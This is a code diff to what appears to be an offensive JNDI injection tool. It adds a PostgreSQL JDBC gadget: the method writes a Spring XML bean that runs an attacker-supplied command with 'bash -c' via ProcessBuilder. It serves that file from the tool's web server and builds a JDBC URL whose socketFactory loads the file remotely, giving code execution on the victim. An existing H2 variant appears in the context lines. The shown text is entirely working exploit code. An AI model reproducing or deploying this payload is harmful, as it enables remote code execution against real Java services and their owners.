@@ -16,6 +16,32 @@ import java.util.List;
 
 @JNDIController
 public class DatabaseController implements Controller {
+    @JNDIMapping("/PostgreSQL/Command/{cmd}")
+    public DatabaseBean postgresqlCommand(String cmd) {
+        String fileName = MiscUtil.getRandStr(12) + ".xml";
+        String fileContent = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
+                "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
+                "    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
+                "    xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
+                "    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
+                "        <constructor-arg>\n" +
+                "        <list>\n" +
+                "            <value>bash</value>\n" +
+                "            <value>-c</value>\n" +
+                "            <value><![CDATA[" + cmd + "]]></value>\n" +
+                "        </list>\n" +
+                "        </constructor-arg>\n" +
+                "    </bean>\n" +
+                "</beans>";
+        WebServer.serveFile( "/" + fileName, fileContent.getBytes());
+
+        String socketFactory = "org.springframework.context.support.ClassPathXmlApplicationContext";
+        String socketFactoryArg = Main.codebase + fileName;
+        String url = "jdbc:postgresql://127.0.0.1:5432/test?socketFactory=" + socketFactory + "&socketFactoryArg=" + socketFactoryArg;
+
+        return new DatabaseBean("org.postgresql.Driver", url);
+    }
+
     @JNDIMapping("/H2/Alias/{cmd}")
     public DatabaseBean h2Alias(String cmd) {
         String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
